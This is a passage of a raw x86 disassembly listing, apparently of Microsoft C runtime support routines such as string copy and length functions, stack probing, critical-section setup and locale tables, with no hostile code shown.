  42371d:	call   DWORD PTR ds:0x428074
  423723:	mov    esi,eax
  423725:	test   esi,esi
  423727:	jne    0x423772
  423729:	push   0x88
  42372e:	push   0x1
  423730:	call   0x424978
  423735:	mov    esi,eax
  423737:	test   esi,esi
  423739:	pop    ecx
  42373a:	pop    ecx
  42373b:	je     0x42376a
  42373d:	push   esi
  42373e:	push   DWORD PTR ds:0x45c304
  423744:	call   DWORD PTR ds:0x428070
  42374a:	test   eax,eax
  42374c:	je     0x42376a
  42374e:	mov    DWORD PTR [esi+0x54],0x45c258
  423755:	mov    DWORD PTR [esi+0x14],0x1
  42375c:	call   DWORD PTR ds:0x42806c
  423762:	or     DWORD PTR [esi+0x4],0xffffffff
  423766:	mov    DWORD PTR [esi],eax
  423768:	jmp    0x423772
  42376a:	push   0x10
  42376c:	call   0x422920
  423771:	pop    ecx
  423772:	push   ebx
  423773:	call   DWORD PTR ds:0x428068
  423779:	mov    eax,esi
  42377b:	pop    esi
  42377c:	pop    ebx
  42377d:	ret    
  42377e:	call   0x4238ed
  423783:	test   eax,eax
  423785:	je     0x423797
  423787:	call   DWORD PTR ds:0x428078
  42378d:	cmp    eax,0xffffffff
  423790:	mov    ds:0x45c304,eax
  423795:	jne    0x42379f
  423797:	call   0x4236ef
  42379c:	xor    eax,eax
  42379e:	ret    
  42379f:	push   esi
  4237a0:	push   0x88
  4237a5:	push   0x1
  4237a7:	call   0x424978
  4237ac:	mov    esi,eax
  4237ae:	test   esi,esi
  4237b0:	pop    ecx
  4237b1:	pop    ecx
  4237b2:	je     0x4237e4
  4237b4:	push   esi
  4237b5:	push   DWORD PTR ds:0x45c304
  4237bb:	call   DWORD PTR ds:0x428070
  4237c1:	test   eax,eax
  4237c3:	je     0x4237e4
  4237c5:	mov    DWORD PTR [esi+0x54],0x45c258
  4237cc:	mov    DWORD PTR [esi+0x14],0x1
  4237d3:	call   DWORD PTR ds:0x42806c
  4237d9:	or     DWORD PTR [esi+0x4],0xffffffff
  4237dd:	mov    DWORD PTR [esi],eax
  4237df:	xor    eax,eax
  4237e1:	inc    eax
  4237e2:	pop    esi
  4237e3:	ret    
  4237e4:	call   0x4236ef
  4237e9:	xor    eax,eax
  4237eb:	pop    esi
  4237ec:	ret    
  4237ed:	cmp    DWORD PTR ds:0x45cac4,0x2
  4237f4:	jne    0x423803
  4237f6:	cmp    DWORD PTR ds:0x45cad0,0x5
  4237fd:	jb     0x423803
  4237ff:	xor    eax,eax
  423801:	inc    eax
  423802:	ret    
  423803:	push   0x3
  423805:	pop    eax
  423806:	ret    
  423807:	xor    eax,eax
  423809:	cmp    DWORD PTR [esp+0x4],eax
  42380d:	push   0x0
  42380f:	sete   al
  423812:	push   0x1000
  423817:	push   eax
  423818:	call   DWORD PTR ds:0x428080
  42381e:	test   eax,eax
  423820:	mov    ds:0x45d140,eax
  423825:	je     0x423851
  423827:	call   0x4237ed
  42382c:	cmp    eax,0x3
  42382f:	mov    ds:0x45d144,eax
  423834:	jne    0x423854
  423836:	push   0x3f8
  42383b:	call   0x424bfa
  423840:	test   eax,eax
  423842:	pop    ecx
  423843:	jne    0x423854
  423845:	push   DWORD PTR ds:0x45d140
  42384b:	call   DWORD PTR ds:0x42807c
  423851:	xor    eax,eax
  423853:	ret    
  423854:	xor    eax,eax
  423856:	inc    eax
  423857:	ret    
  423858:	push   0x425728
  42385d:	mov    eax,fs:0x0
  423863:	push   eax
  423864:	mov    eax,DWORD PTR [esp+0x10]
  423868:	mov    DWORD PTR [esp+0x10],ebp
  42386c:	lea    ebp,[esp+0x10]
  423870:	sub    esp,eax
  423872:	push   ebx
  423873:	push   esi
  423874:	push   edi
  423875:	mov    eax,DWORD PTR [ebp-0x8]
  423878:	mov    DWORD PTR [ebp-0x18],esp
  42387b:	push   eax
  42387c:	mov    eax,DWORD PTR [ebp-0x4]
  42387f:	mov    DWORD PTR [ebp-0x4],0xffffffff
  423886:	mov    DWORD PTR [ebp-0x8],eax
  423889:	lea    eax,[ebp-0x10]
  42388c:	mov    fs:0x0,eax
  423892:	ret    
  423893:	mov    ecx,DWORD PTR [ebp-0x10]
  423896:	mov    DWORD PTR fs:0x0,ecx
  42389d:	pop    ecx
  42389e:	pop    edi
  42389f:	pop    esi
  4238a0:	pop    ebx
  4238a1:	leave  
  4238a2:	push   ecx
  4238a3:	ret    
  4238a4:	int3   
  4238a5:	int3   
  4238a6:	int3   
  4238a7:	int3   
  4238a8:	int3   
  4238a9:	int3   
  4238aa:	int3   
  4238ab:	int3   
  4238ac:	int3   
  4238ad:	int3   
  4238ae:	int3   
  4238af:	int3   
  4238b0:	cmp    eax,0x1000
  4238b5:	jae    0x4238c5
  4238b7:	neg    eax
  4238b9:	add    eax,esp
  4238bb:	add    eax,0x4
  4238be:	test   DWORD PTR [eax],eax
  4238c0:	xchg   esp,eax
  4238c1:	mov    eax,DWORD PTR [eax]
  4238c3:	push   eax
  4238c4:	ret    
  4238c5:	push   ecx
  4238c6:	lea    ecx,[esp+0x8]
  4238ca:	sub    ecx,0x1000
  4238d0:	sub    eax,0x1000
  4238d5:	test   DWORD PTR [ecx],eax
  4238d7:	cmp    eax,0x1000
  4238dc:	jae    0x4238ca
  4238de:	sub    ecx,eax
  4238e0:	mov    eax,esp
  4238e2:	test   DWORD PTR [ecx],eax
  4238e4:	mov    esp,ecx
  4238e6:	mov    ecx,DWORD PTR [eax]
  4238e8:	mov    eax,DWORD PTR [eax+0x4]
  4238eb:	push   eax
  4238ec:	ret    
  4238ed:	push   esi
  4238ee:	push   edi
  4238ef:	xor    esi,esi
  4238f1:	mov    edi,0x45cc20
  4238f6:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  4238fe:	jne    0x42391e
  423900:	lea    eax,[esi*8+0x45c310]
  423907:	mov    DWORD PTR [eax],edi
  423909:	push   0xfa0
  42390e:	push   DWORD PTR [eax]
  423910:	add    edi,0x18
  423913:	call   0x4248ed
  423918:	test   eax,eax
  42391a:	pop    ecx
  42391b:	pop    ecx
  42391c:	je     0x42392a
  42391e:	inc    esi
  42391f:	cmp    esi,0x24
  423922:	jl     0x4238f6
  423924:	xor    eax,eax
  423926:	inc    eax
  423927:	pop    edi
  423928:	pop    esi
  423929:	ret    
  42392a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423932:	xor    eax,eax
  423934:	jmp    0x423927
  423936:	push   ebx
  423937:	mov    ebx,DWORD PTR ds:0x428060
  42393d:	push   esi
  42393e:	mov    esi,0x45c310
  423943:	push   edi
  423944:	mov    edi,DWORD PTR [esi]
  423946:	test   edi,edi
  423948:	je     0x42395d
  42394a:	cmp    DWORD PTR [esi+0x4],0x1
  42394e:	je     0x42395d
  423950:	push   edi
  423951:	call   ebx
  423953:	push   edi
  423954:	call   0x42446a
  423959:	and    DWORD PTR [esi],0x0
  42395c:	pop    ecx
  42395d:	add    esi,0x8
  423960:	cmp    esi,0x45c430
  423966:	jl     0x423944
  423968:	mov    esi,0x45c310
  42396d:	pop    edi
  42396e:	mov    eax,DWORD PTR [esi]
  423970:	test   eax,eax
  423972:	je     0x42397d
  423974:	cmp    DWORD PTR [esi+0x4],0x1
  423978:	jne    0x42397d
  42397a:	push   eax
  42397b:	call   ebx
  42397d:	add    esi,0x8
  423980:	cmp    esi,0x45c430
  423986:	jl     0x42396e
  423988:	pop    esi
  423989:	pop    ebx
  42398a:	ret    
  42398b:	push   ebp
  42398c:	mov    ebp,esp
  42398e:	mov    eax,DWORD PTR [ebp+0x8]
  423991:	push   DWORD PTR [eax*8+0x45c310]
  423998:	call   DWORD PTR ds:0x42808c
  42399e:	pop    ebp
  42399f:	ret    
  4239a0:	push   ebp
  4239a1:	mov    ebp,esp
  4239a3:	push   esi
  4239a4:	mov    esi,DWORD PTR [ebp+0x8]
  4239a7:	lea    esi,[esi*8+0x45c310]
  4239ae:	cmp    DWORD PTR [esi],0x0
  4239b1:	je     0x4239b8
  4239b3:	xor    eax,eax
  4239b5:	inc    eax
  4239b6:	jmp    0x423a1c
  4239b8:	push   edi
  4239b9:	push   0x18
  4239bb:	call   0x424582
  4239c0:	mov    edi,eax
  4239c2:	test   edi,edi
  4239c4:	pop    ecx
  4239c5:	jne    0x4239d6
  4239c7:	call   0x425800
  4239cc:	mov    DWORD PTR [eax],0xc
  4239d2:	xor    eax,eax
  4239d4:	jmp    0x423a1b
  4239d6:	push   0xa
  4239d8:	call   0x423a1f
  4239dd:	cmp    DWORD PTR [esi],0x0
  4239e0:	pop    ecx
  4239e1:	jne    0x423a09
  4239e3:	push   0xfa0
  4239e8:	push   edi
  4239e9:	call   0x4248ed
  4239ee:	test   eax,eax
  4239f0:	pop    ecx
  4239f1:	pop    ecx
  4239f2:	jne    0x423a05
  4239f4:	push   edi
  4239f5:	call   0x42446a
  4239fa:	push   0xa
  4239fc:	call   0x42398b
  423a01:	pop    ecx
  423a02:	pop    ecx
  423a03:	jmp    0x4239c7
  423a05:	mov    DWORD PTR [esi],edi
  423a07:	jmp    0x423a10
  423a09:	push   edi
  423a0a:	call   0x42446a
  423a0f:	pop    ecx
  423a10:	push   0xa
  423a12:	call   0x42398b
  423a17:	xor    eax,eax
  423a19:	pop    ecx
  423a1a:	inc    eax
  423a1b:	pop    edi
  423a1c:	pop    esi
  423a1d:	pop    ebp
  423a1e:	ret    
  423a1f:	push   ebp
  423a20:	mov    ebp,esp
  423a22:	mov    eax,DWORD PTR [ebp+0x8]
  423a25:	push   esi
  423a26:	lea    esi,[eax*8+0x45c310]
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	jne    0x423a45
  423a32:	push   eax
  423a33:	call   0x4239a0
  423a38:	test   eax,eax
  423a3a:	pop    ecx
  423a3b:	jne    0x423a45
  423a3d:	push   0x11
  423a3f:	call   0x422920
  423a44:	pop    ecx
  423a45:	push   DWORD PTR [esi]
  423a47:	call   DWORD PTR ds:0x428090
  423a4d:	pop    esi
  423a4e:	pop    ebp
  423a4f:	ret    
  423a50:	push   esi
  423a51:	push   DWORD PTR ds:0x45d268
  423a57:	call   0x4259b6
  423a5c:	pop    ecx
  423a5d:	mov    ecx,DWORD PTR ds:0x45d264
  423a63:	mov    esi,eax
  423a65:	mov    eax,ds:0x45d268
  423a6a:	mov    edx,ecx
  423a6c:	sub    edx,eax
  423a6e:	add    edx,0x4
  423a71:	cmp    esi,edx
  423a73:	jae    0x423ac3
  423a75:	mov    ecx,0x800
  423a7a:	cmp    esi,ecx
  423a7c:	jae    0x423a80
  423a7e:	mov    ecx,esi
  423a80:	add    ecx,esi
  423a82:	push   ecx
  423a83:	push   eax
  423a84:	call   0x425809
  423a89:	test   eax,eax
  423a8b:	pop    ecx
  423a8c:	pop    ecx
  423a8d:	jne    0x423aa6
  423a8f:	add    esi,0x10
  423a92:	push   esi
  423a93:	push   DWORD PTR ds:0x45d268
  423a99:	call   0x425809
  423a9e:	test   eax,eax
  423aa0:	pop    ecx
  423aa1:	pop    ecx
  423aa2:	jne    0x423aa6
  423aa4:	pop    esi
  423aa5:	ret    
  423aa6:	mov    ecx,DWORD PTR ds:0x45d264
  423aac:	sub    ecx,DWORD PTR ds:0x45d268
  423ab2:	mov    ds:0x45d268,eax
  423ab7:	sar    ecx,0x2
  423aba:	lea    ecx,[eax+ecx*4]
  423abd:	mov    DWORD PTR ds:0x45d264,ecx
  423ac3:	mov    DWORD PTR [ecx],edi
  423ac5:	add    DWORD PTR ds:0x45d264,0x4
  423acc:	mov    eax,edi
  423ace:	pop    esi
  423acf:	ret    
  423ad0:	push   0x80
  423ad5:	call   0x424582
  423ada:	test   eax,eax
  423adc:	pop    ecx
  423add:	mov    ds:0x45d268,eax
  423ae2:	jne    0x423ae8
  423ae4:	push   0x18
  423ae6:	pop    eax
  423ae7:	ret    
  423ae8:	and    DWORD PTR [eax],0x0
  423aeb:	mov    eax,ds:0x45d268
  423af0:	mov    ds:0x45d264,eax
  423af5:	xor    eax,eax
  423af7:	ret    
  423af8:	push   0xc
  423afa:	push   0x4284c0
  423aff:	call   0x423858
  423b04:	call   0x422b6b
  423b09:	and    DWORD PTR [ebp-0x4],0x0
  423b0d:	mov    edi,DWORD PTR [ebp+0x8]
  423b10:	call   0x423a50
  423b15:	mov    DWORD PTR [ebp-0x1c],eax
  423b18:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b1c:	call   0x423b2a
  423b21:	mov    eax,DWORD PTR [ebp-0x1c]
  423b24:	call   0x423893
  423b29:	ret    
  423b2a:	call   0x422b74
  423b2f:	ret    
  423b30:	push   DWORD PTR [esp+0x4]
  423b34:	call   0x423af8
  423b39:	neg    eax
  423b3b:	sbb    eax,eax
  423b3d:	neg    eax
  423b3f:	pop    ecx
  423b40:	dec    eax
  423b41:	ret    
  423b42:	push   ebp
  423b43:	mov    ebp,esp
  423b45:	sub    esp,0x10
  423b48:	push   ebx
  423b49:	xor    ebx,ebx
  423b4b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423b51:	push   esi
  423b52:	push   edi
  423b53:	jne    0x423bc2
  423b55:	push   0x428530
  423b5a:	call   DWORD PTR ds:0x428094
  423b60:	mov    edi,eax
  423b62:	cmp    edi,ebx
  423b64:	je     0x423bfd
  423b6a:	mov    esi,DWORD PTR ds:0x428018
  423b70:	push   0x428524
  423b75:	push   edi
  423b76:	call   esi
  423b78:	test   eax,eax
  423b7a:	mov    ds:0x45cd70,eax
  423b7f:	je     0x423bfd
  423b81:	push   0x428514
  423b86:	push   edi
  423b87:	call   esi
  423b89:	push   0x428500
  423b8e:	push   edi
  423b8f:	mov    ds:0x45cd74,eax
  423b94:	call   esi
  423b96:	cmp    DWORD PTR ds:0x45cac4,0x2
  423b9d:	mov    ds:0x45cd78,eax
  423ba2:	jne    0x423bc2
  423ba4:	push   0x4284e4
  423ba9:	push   edi
  423baa:	call   esi
  423bac:	test   eax,eax
  423bae:	mov    ds:0x45cd80,eax
  423bb3:	je     0x423bc2
  423bb5:	push   0x4284cc
  423bba:	push   edi
  423bbb:	call   esi
  423bbd:	mov    ds:0x45cd7c,eax
  423bc2:	mov    eax,ds:0x45cd7c
  423bc7:	test   eax,eax
  423bc9:	je     0x423c07
  423bcb:	call   eax
  423bcd:	test   eax,eax
  423bcf:	je     0x423bee
  423bd1:	lea    ecx,[ebp-0x4]
  423bd4:	push   ecx
  423bd5:	push   0xc
  423bd7:	lea    ecx,[ebp-0x10]
  423bda:	push   ecx
  423bdb:	push   0x1
  423bdd:	push   eax
  423bde:	call   DWORD PTR ds:0x45cd80
  423be4:	test   eax,eax
  423be6:	je     0x423bee
  423be8:	test   BYTE PTR [ebp-0x8],0x1
  423bec:	jne    0x423c07
  423bee:	cmp    DWORD PTR ds:0x45cad0,0x4
  423bf5:	jb     0x423c01
  423bf7:	or     BYTE PTR [ebp+0x12],0x20
  423bfb:	jmp    0x423c26
  423bfd:	xor    eax,eax
  423bff:	jmp    0x423c36
  423c01:	or     BYTE PTR [ebp+0x12],0x4
  423c05:	jmp    0x423c26
  423c07:	mov    eax,ds:0x45cd74
  423c0c:	test   eax,eax
  423c0e:	je     0x423c26
  423c10:	call   eax
  423c12:	mov    ebx,eax
  423c14:	test   ebx,ebx
  423c16:	je     0x423c26
  423c18:	mov    eax,ds:0x45cd78
  423c1d:	test   eax,eax
  423c1f:	je     0x423c26
  423c21:	push   ebx
  423c22:	call   eax
  423c24:	mov    ebx,eax
  423c26:	push   DWORD PTR [ebp+0x10]
  423c29:	push   DWORD PTR [ebp+0xc]
  423c2c:	push   DWORD PTR [ebp+0x8]
  423c2f:	push   ebx
  423c30:	call   DWORD PTR ds:0x45cd70
  423c36:	pop    edi
  423c37:	pop    esi
  423c38:	pop    ebx
  423c39:	leave  
  423c3a:	ret    
  423c3b:	int3   
  423c3c:	int3   
  423c3d:	int3   
  423c3e:	int3   
  423c3f:	int3   
  423c40:	push   edi
  423c41:	mov    edi,DWORD PTR [esp+0x8]
  423c45:	jmp    0x423cb5
  423c47:	lea    esp,[esp+0x0]
  423c4e:	mov    edi,edi
  423c50:	mov    ecx,DWORD PTR [esp+0x4]
  423c54:	push   edi
  423c55:	test   ecx,0x3
  423c5b:	je     0x423c70
  423c5d:	mov    al,BYTE PTR [ecx]
  423c5f:	add    ecx,0x1
  423c62:	test   al,al
  423c64:	je     0x423ca3
  423c66:	test   ecx,0x3
  423c6c:	jne    0x423c5d
  423c6e:	mov    edi,edi
  423c70:	mov    eax,DWORD PTR [ecx]
  423c72:	mov    edx,0x7efefeff
  423c77:	add    edx,eax
  423c79:	xor    eax,0xffffffff
  423c7c:	xor    eax,edx
  423c7e:	add    ecx,0x4
  423c81:	test   eax,0x81010100
  423c86:	je     0x423c70
  423c88:	mov    eax,DWORD PTR [ecx-0x4]
  423c8b:	test   al,al
  423c8d:	je     0x423cb2
  423c8f:	test   ah,ah
  423c91:	je     0x423cad
  423c93:	test   eax,0xff0000
  423c98:	je     0x423ca8
  423c9a:	test   eax,0xff000000
  423c9f:	je     0x423ca3
  423ca1:	jmp    0x423c70
  423ca3:	lea    edi,[ecx-0x1]
  423ca6:	jmp    0x423cb5
  423ca8:	lea    edi,[ecx-0x2]
  423cab:	jmp    0x423cb5
  423cad:	lea    edi,[ecx-0x3]
  423cb0:	jmp    0x423cb5
  423cb2:	lea    edi,[ecx-0x4]
  423cb5:	mov    ecx,DWORD PTR [esp+0xc]
  423cb9:	test   ecx,0x3
  423cbf:	je     0x423cde
  423cc1:	mov    dl,BYTE PTR [ecx]
  423cc3:	add    ecx,0x1
  423cc6:	test   dl,dl
  423cc8:	je     0x423d30
  423cca:	mov    BYTE PTR [edi],dl
  423ccc:	add    edi,0x1
  423ccf:	test   ecx,0x3
  423cd5:	jne    0x423cc1
  423cd7:	jmp    0x423cde
  423cd9:	mov    DWORD PTR [edi],edx
  423cdb:	add    edi,0x4
  423cde:	mov    edx,0x7efefeff
  423ce3:	mov    eax,DWORD PTR [ecx]
  423ce5:	add    edx,eax
  423ce7:	xor    eax,0xffffffff
  423cea:	xor    eax,edx
  423cec:	mov    edx,DWORD PTR [ecx]
  423cee:	add    ecx,0x4
  423cf1:	test   eax,0x81010100
  423cf6:	je     0x423cd9
  423cf8:	test   dl,dl
  423cfa:	je     0x423d30
  423cfc:	test   dh,dh
  423cfe:	je     0x423d27
  423d00:	test   edx,0xff0000
  423d06:	je     0x423d1a
  423d08:	test   edx,0xff000000
  423d0e:	je     0x423d12
  423d10:	jmp    0x423cd9
  423d12:	mov    DWORD PTR [edi],edx
  423d14:	mov    eax,DWORD PTR [esp+0x8]
  423d18:	pop    edi
  423d19:	ret    
  423d1a:	mov    WORD PTR [edi],dx
  423d1d:	mov    eax,DWORD PTR [esp+0x8]
  423d21:	mov    BYTE PTR [edi+0x2],0x0
  423d25:	pop    edi
  423d26:	ret    
  423d27:	mov    WORD PTR [edi],dx
  423d2a:	mov    eax,DWORD PTR [esp+0x8]
  423d2e:	pop    edi
  423d2f:	ret    
  423d30:	mov    BYTE PTR [edi],dl
  423d32:	mov    eax,DWORD PTR [esp+0x8]
  423d36:	pop    edi
  423d37:	ret    
  423d38:	int3   
  423d39:	int3   
  423d3a:	int3   
  423d3b:	int3   
  423d3c:	int3   
  423d3d:	int3   
  423d3e:	int3   
  423d3f:	int3   
  423d40:	mov    ecx,DWORD PTR [esp+0xc]
  423d44:	push   edi
  423d45:	test   ecx,ecx
  423d47:	je     0x423ddf
  423d4d:	push   esi
  423d4e:	push   ebx
  423d4f:	mov    ebx,ecx
  423d51:	mov    esi,DWORD PTR [esp+0x14]
  423d55:	test   esi,0x3
  423d5b:	mov    edi,DWORD PTR [esp+0x10]
  423d5f:	jne    0x423d6c
  423d61:	shr    ecx,0x2
  423d64:	jne    0x423def
  423d6a:	jmp    0x423d93
  423d6c:	mov    al,BYTE PTR [esi]
  423d6e:	add    esi,0x1
  423d71:	mov    BYTE PTR [edi],al
  423d73:	add    edi,0x1
  423d76:	sub    ecx,0x1
  423d79:	je     0x423da6
  423d7b:	test   al,al
  423d7d:	je     0x423dae
  423d7f:	test   esi,0x3
  423d85:	jne    0x423d6c
  423d87:	mov    ebx,ecx
  423d89:	shr    ecx,0x2
  423d8c:	jne    0x423def
  423d8e:	and    ebx,0x3
  423d91:	je     0x423da6
  423d93:	mov    al,BYTE PTR [esi]
  423d95:	add    esi,0x1
  423d98:	mov    BYTE PTR [edi],al
  423d9a:	add    edi,0x1
  423d9d:	test   al,al
  423d9f:	je     0x423dd8
  423da1:	sub    ebx,0x1
  423da4:	jne    0x423d93
  423da6:	mov    eax,DWORD PTR [esp+0x10]
  423daa:	pop    ebx
  423dab:	pop    esi
  423dac:	pop    edi
  423dad:	ret    
  423dae:	test   edi,0x3
  423db4:	je     0x423dcc
  423db6:	mov    BYTE PTR [edi],al
  423db8:	add    edi,0x1
  423dbb:	sub    ecx,0x1
  423dbe:	je     0x423e5c
  423dc4:	test   edi,0x3
  423dca:	jne    0x423db6
  423dcc:	mov    ebx,ecx
  423dce:	shr    ecx,0x2
  423dd1:	jne    0x423e47
  423dd3:	mov    BYTE PTR [edi],al
  423dd5:	add    edi,0x1
  423dd8:	sub    ebx,0x1
  423ddb:	jne    0x423dd3
  423ddd:	pop    ebx
  423dde:	pop    esi
  423ddf:	mov    eax,DWORD PTR [esp+0x8]
  423de3:	pop    edi
  423de4:	ret    
  423de5:	mov    DWORD PTR [edi],edx
  423de7:	add    edi,0x4
  423dea:	sub    ecx,0x1
  423ded:	je     0x423d8e
  423def:	mov    edx,0x7efefeff
  423df4:	mov    eax,DWORD PTR [esi]
  423df6:	add    edx,eax
  423df8:	xor    eax,0xffffffff
  423dfb:	xor    eax,edx
  423dfd:	mov    edx,DWORD PTR [esi]
  423dff:	add    esi,0x4
  423e02:	test   eax,0x81010100
  423e07:	je     0x423de5
  423e09:	test   dl,dl
  423e0b:	je     0x423e39
  423e0d:	test   dh,dh
  423e0f:	je     0x423e2f
  423e11:	test   edx,0xff0000
  423e17:	je     0x423e25
  423e19:	test   edx,0xff000000
  423e1f:	jne    0x423de5
  423e21:	mov    DWORD PTR [edi],edx
  423e23:	jmp    0x423e3d
  423e25:	and    edx,0xffff
  423e2b:	mov    DWORD PTR [edi],edx
  423e2d:	jmp    0x423e3d
  423e2f:	and    edx,0xff
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	jmp    0x423e3d
  423e39:	xor    edx,edx
  423e3b:	mov    DWORD PTR [edi],edx
  423e3d:	add    edi,0x4
  423e40:	xor    eax,eax
  423e42:	sub    ecx,0x1
  423e45:	je     0x423e53
  423e47:	xor    eax,eax
  423e49:	mov    DWORD PTR [edi],eax
  423e4b:	add    edi,0x4
  423e4e:	sub    ecx,0x1
  423e51:	jne    0x423e49
  423e53:	and    ebx,0x3
  423e56:	jne    0x423dd3
  423e5c:	mov    eax,DWORD PTR [esp+0x10]
  423e60:	pop    ebx
  423e61:	pop    esi
  423e62:	pop    edi
  423e63:	ret    
  423e64:	int3   
  423e65:	int3   
  423e66:	int3   
  423e67:	int3   
  423e68:	int3   
  423e69:	int3   
  423e6a:	int3   
  423e6b:	int3   
  423e6c:	int3   
  423e6d:	int3   
  423e6e:	int3   
  423e6f:	int3   
  423e70:	mov    ecx,DWORD PTR [esp+0x4]
  423e74:	test   ecx,0x3
  423e7a:	je     0x423ea0
  423e7c:	mov    al,BYTE PTR [ecx]
  423e7e:	add    ecx,0x1
  423e81:	test   al,al
  423e83:	je     0x423ed3
  423e85:	test   ecx,0x3
  423e8b:	jne    0x423e7c
  423e8d:	add    eax,0x0
  423e92:	lea    esp,[esp+0x0]
  423e99:	lea    esp,[esp+0x0]
  423ea0:	mov    eax,DWORD PTR [ecx]
  423ea2:	mov    edx,0x7efefeff
  423ea7:	add    edx,eax
  423ea9:	xor    eax,0xffffffff
  423eac:	xor    eax,edx
  423eae:	add    ecx,0x4
  423eb1:	test   eax,0x81010100
  423eb6:	je     0x423ea0
  423eb8:	mov    eax,DWORD PTR [ecx-0x4]
  423ebb:	test   al,al
  423ebd:	je     0x423ef1
  423ebf:	test   ah,ah
  423ec1:	je     0x423ee7
  423ec3:	test   eax,0xff0000
  423ec8:	je     0x423edd
  423eca:	test   eax,0xff000000
  423ecf:	je     0x423ed3
  423ed1:	jmp    0x423ea0
  423ed3:	lea    eax,[ecx-0x1]
  423ed6:	mov    ecx,DWORD PTR [esp+0x4]
  423eda:	sub    eax,ecx
  423edc:	ret    
  423edd:	lea    eax,[ecx-0x2]
  423ee0:	mov    ecx,DWORD PTR [esp+0x4]
  423ee4:	sub    eax,ecx
  423ee6:	ret    
  423ee7:	lea    eax,[ecx-0x3]
  423eea:	mov    ecx,DWORD PTR [esp+0x4]
  423eee:	sub    eax,ecx
  423ef0:	ret    
  423ef1:	lea    eax,[ecx-0x4]
  423ef4:	mov    ecx,DWORD PTR [esp+0x4]
  423ef8:	sub    eax,ecx
  423efa:	ret    
  423efb:	push   0x8
  423efd:	push   0x428540
  423f02:	call   0x423858
  423f07:	and    DWORD PTR [ebp-0x4],0x0
  423f0b:	push   0x0
  423f0d:	push   0x1
  423f0f:	call   0x425a82
  423f14:	pop    ecx
  423f15:	pop    ecx
  423f16:	jmp    0x423f1f
  423f18:	xor    eax,eax
  423f1a:	inc    eax
  423f1b:	ret    
  423f1c:	mov    esp,DWORD PTR [ebp-0x18]
  423f1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f23:	push   0x3
  423f25:	call   DWORD PTR ds:0x428028
  423f2b:	int3   
  423f2c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f32:	jne    0x423f35
  423f34:	ret    
  423f35:	jmp    0x423efb
  423f3a:	movzx  eax,BYTE PTR [esp+0x4]
  423f3f:	mov    cl,BYTE PTR [esp+0xc]
  423f43:	test   BYTE PTR [eax+0x45cf21],cl
  423f49:	jne    0x423f67
  423f4b:	cmp    DWORD PTR [esp+0x8],0x0
  423f50:	je     0x423f60
  423f52:	movzx  eax,WORD PTR [eax*2+0x42893a]
  423f5a:	and    eax,DWORD PTR [esp+0x8]
  423f5e:	jmp    0x423f62
  423f60:	xor    eax,eax
  423f62:	test   eax,eax
  423f64:	jne    0x423f67
  423f66:	ret    
  423f67:	xor    eax,eax
  423f69:	inc    eax
  423f6a:	ret    
  423f6b:	push   0x4
  423f6d:	push   0x0
  423f6f:	push   DWORD PTR [esp+0xc]
  423f73:	call   0x423f3a
  423f78:	add    esp,0xc
  423f7b:	ret    
  423f7c:	sub    eax,0x3a4
  423f81:	je     0x423fa5
  423f83:	sub    eax,0x4
  423f86:	je     0x423f9f
  423f88:	sub    eax,0xd
  423f8b:	je     0x423f99
  423f8d:	dec    eax
  423f8e:	je     0x423f93
  423f90:	xor    eax,eax
  423f92:	ret    
  423f93:	mov    eax,0x404
  423f98:	ret    
  423f99:	mov    eax,0x412
  423f9e:	ret    
  423f9f:	mov    eax,0x804
  423fa4:	ret    
  423fa5:	mov    eax,0x411
  423faa:	ret    
  423fab:	push   edi
  423fac:	push   0x40
  423fae:	xor    eax,eax
  423fb0:	pop    ecx
  423fb1:	mov    edi,0x45cf20
  423fb6:	rep stos DWORD PTR es:[edi],eax
  423fb8:	stos   BYTE PTR es:[edi],al
  423fb9:	xor    eax,eax
  423fbb:	mov    ds:0x45d024,eax
  423fc0:	mov    ds:0x45cf1c,eax
  423fc5:	mov    ds:0x45cf14,eax
  423fca:	mov    edi,0x45d030
  423fcf:	stos   DWORD PTR es:[edi],eax
  423fd0:	stos   DWORD PTR es:[edi],eax
  423fd1:	stos   DWORD PTR es:[edi],eax
  423fd2:	pop    edi
  423fd3:	ret    
  423fd4:	push   ebp
  423fd5:	mov    ebp,esp
  423fd7:	sub    esp,0x518
  423fdd:	mov    eax,ds:0x45c430
  423fe2:	xor    eax,DWORD PTR [ebp+0x4]
  423fe5:	push   esi
  423fe6:	mov    DWORD PTR [ebp-0x4],eax
  423fe9:	lea    eax,[ebp-0x18]
  423fec:	push   eax
  423fed:	push   DWORD PTR ds:0x45d024
  423ff3:	call   DWORD PTR ds:0x4280a0
  423ff9:	cmp    eax,0x1
  423ffc:	mov    esi,0x100
  424001:	jne    0x424114
  424007:	xor    eax,eax
  424009:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424010:	inc    eax
  424011:	cmp    eax,esi
  424013:	jb     0x424009
  424015:	mov    al,BYTE PTR [ebp-0x12]
  424018:	test   al,al
  42401a:	mov    BYTE PTR [ebp-0x118],0x20
  424021:	je     0x424059
  424023:	push   ebx
  424024:	lea    edx,[ebp-0x11]
  424027:	push   edi
  424028:	movzx  ecx,BYTE PTR [edx]
  42402b:	movzx  eax,al
  42402e:	cmp    eax,ecx
  424030:	ja     0x42404f
  424032:	sub    ecx,eax
  424034:	inc    ecx
  424035:	mov    ebx,ecx
  424037:	shr    ecx,0x2
  42403a:	lea    edi,[ebp+eax*1-0x118]
  424041:	mov    eax,0x20202020
  424046:	rep stos DWORD PTR es:[edi],eax
  424048:	mov    ecx,ebx
  42404a:	and    ecx,0x3
  42404d:	rep stos BYTE PTR es:[edi],al
  42404f:	inc    edx
  424050:	mov    al,BYTE PTR [edx]
  424052:	inc    edx
  424053:	test   al,al
  424055:	jne    0x424028
  424057:	pop    edi
  424058:	pop    ebx
  424059:	push   0x0
  42405b:	push   DWORD PTR ds:0x45cf14
  424061:	lea    eax,[ebp-0x518]
  424067:	push   DWORD PTR ds:0x45d024
  42406d:	push   eax
  42406e:	push   esi
  42406f:	lea    eax,[ebp-0x118]
  424075:	push   eax
  424076:	push   0x1
  424078:	call   0x425f88
  42407d:	push   0x0
  42407f:	push   DWORD PTR ds:0x45d024
  424085:	lea    eax,[ebp-0x218]
  42408b:	push   esi
  42408c:	push   eax
  42408d:	push   esi
  42408e:	lea    eax,[ebp-0x118]
